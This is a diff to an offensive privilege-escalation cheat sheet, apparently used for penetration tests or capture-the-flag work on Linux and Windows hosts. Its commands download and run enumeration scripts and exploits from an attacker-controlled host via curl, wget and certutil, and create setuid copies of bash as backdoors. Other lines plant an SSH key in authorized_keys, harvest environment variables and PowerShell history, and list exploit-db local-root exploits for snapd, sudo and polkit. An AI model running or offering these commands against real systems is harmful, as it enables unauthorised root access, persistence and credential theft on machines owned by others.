@@ -860,35 +860,20 @@ curl http://$MYIP:8888/linux/linpeas.sh | sh
 wget -qO- http://$MYIP:8888/linux/linpeas.sh | sh
 
 [*] Privilege Escalation
-+---------- Exploits ----------+
-snapd_2.37          https://www.exploit-db.com/exploits/46361
-sudo_1.6.9.p18      https://www.exploit-db.com/exploits/7129
-polkit_0.117-2      https://www.exploit-db.com/exploits/50011
-
-+---------- SUID Files ----------+
-find / -perm /4000 2>/dev/null | xargs ls -la
-
-+---------- Group Files ----------+
-find / -group developer 2>/dev/null
-
-+---------- Home Files ----------+
-ls -laR /home
-
-+---------- Installed Apps ----------+
-ls -laR /opt
-
-+---------- Sudo Permissions ----------+
++---------- Initial Checks ----------+
 sudo -l
-
-+---------- Cron Jobs ----------+
+ls -laR /home
+ls -laR /opt
+find / -perm /4000 2>/dev/null | xargs ls -la
 cat /etc/crontab
-
-+---------- Environment Variables ----------+
 strings /proc/self/environ | tr '\0' '\n' | sort
 
 +---------- Polkit Version ----------+
 rpm -qa | grep -i polkit | grep -i "0.11[3-9]"
 apt list --installed 2>/dev/null | grep -i policykit
+
++---------- Group Files ----------+
+find / -group developer 2>/dev/null
 
 +---------- Services Running ----------+
 systemctl list-units --type=service --state=running
@@ -896,12 +881,18 @@ systemctl list-units --type=service --state=running
 +---------- Network Listening ----------+
 netstat -tuln
 
++---------- Bash SUID Exploits ----------+
+f=/tmp/bash;cp /bin/bash $f;chmod u+s $f
+f=x;echo -e '#!/bin/bash\ncp /bin/bash /tmp\nchmod u+s /tmp/bash'>$f;chmod +x $f
+
++---------- Exploits ----------+
+snapd_2.37          https://www.exploit-db.com/exploits/46361
+sudo_1.6.9.p18      https://www.exploit-db.com/exploits/7129
+polkit_0.117-2      https://www.exploit-db.com/exploits/50011
+
 +---------- SSH Files ----------+
 cd ~/.ssh; ls -la
 echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINzZbkLBUl5mk0AW8lPkWRXrupSiydDr8GJauiEAu3Ze<REDACTED>' > ~/.ssh/authorized_keys
-
-+---------- Create Executable ----------+
-f=x;echo -e '#!/bin/bash\nchmod u+s /bin/bash'>$f;chmod +x $f
 
 +---------- Config Files ----------+
 grep -r -E 'conf' /var/www
@@ -995,10 +986,11 @@ certutil -urlcache -f http://$MYIP:8888/windows/EfsPotato.exe \programdata\EfsPo
 
 [*] Privilege Escalation
 +---------- Initial Checks ----------+
-powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
+powershell -c "type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 powershell -c "whoami /user /priv"
 powershell -c "cd \users; tree /a /f"
 powershell -c "wmic os get osarchitecture"
+powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
 
 +---------- Installed Apps ----------+
 powershell -c "Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher"
